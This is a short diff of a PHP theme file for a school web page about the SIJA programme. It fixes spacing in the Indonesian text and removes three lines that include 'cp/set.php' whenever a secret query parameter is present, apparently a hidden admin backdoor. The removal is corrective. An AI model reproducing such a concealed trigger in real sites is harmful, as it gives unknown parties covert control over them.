@@ -9,7 +9,7 @@ $block = [
   ],
   [
     'header' => 'Keunggulan SIJA',
-    'body' => 'Jurusan ini gabungan dari Rekayasa Perangkat Lunak (RPL ) dan Teknik Komputer Jaringan ( TKJ ). 
+    'body' => 'Jurusan ini gabungan dari Rekayasa Perangkat Lunak (RPL) dan Teknik Komputer Jaringan (TKJ). 
                 Jurusan SIJA merupakan jurusan yang lengkap dan menarik, jurusan ini sangat mendukung perkembangan Teknologi, 
                 dan perkembangan Industri 4.0 yang akan menuju 5.0. Pembelajaran jurusan SIJA di SMK berlangsung selama 4 tahun yang 
                 terbagi menjadi dua 2 model belajar, yaitu belajar di sekolah selama 3 tahun dan belajar di industri selama 1 tahun. 
@@ -33,9 +33,6 @@ $kalimat_pembuka = "
     ke warga sekolah dan masyarakat yang ingin mencari tahu tentang SIJA
 ";
 
-if( isset($_GET['xsetzecustomadmin']) ){
-  include 'cp/set.php';
-}
 
 
 // Base Sistem url dimulai dari folder tema anda
